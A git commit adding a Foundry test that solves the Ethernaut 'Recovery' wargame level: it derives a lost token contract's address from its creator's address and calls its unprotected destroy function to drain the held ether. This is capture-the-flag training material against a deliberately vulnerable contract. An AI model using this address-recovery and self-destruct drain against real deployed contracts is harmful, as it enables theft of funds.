3dde9210e8372f64340834ecad2a6b4affa38353
DDEENNY <a39955720@gmail.com>
2025-02-09 00:27:39 +0800

    17-Recovery

---
+++ test/Recovery.t.sol
@@ -0,0 +1,50 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.27;
+
+import {Test, console} from "forge-std/Test.sol";
+import {StdCheats} from "forge-std/StdCheats.sol";
+import "../src/Recovery/RecoveryFactory.sol";
+import "../src/Ethernaut.sol";
+
+contract RecoveryTest is StdCheats, Test {
+    Ethernaut ethernaut;
+    address eoaAddress = address(100);
+
+    function setUp() public {
+        // Setup instance of the Ethernaut contract
+        ethernaut = new Ethernaut();
+        // Deal EOA address some ether
+        vm.deal(eoaAddress, 5 ether);
+    }
+
+    function testRecovery() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
+
+        RecoveryFactory recoveryFactory = new RecoveryFactory();
+        ethernaut.registerLevel(recoveryFactory);
+        vm.startPrank(eoaAddress);
+        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);
+        Recovery ethernautRecovery = Recovery(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+        address _simpleTokenAddr = address(
+            uint160(
+                uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), address(ethernautRecovery), uint8(0x01))))
+            )
+        );
+        SimpleToken _simpleToken = SimpleToken(payable(_simpleTokenAddr));
+        _simpleToken.destroy(payable(msg.sender));
+
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
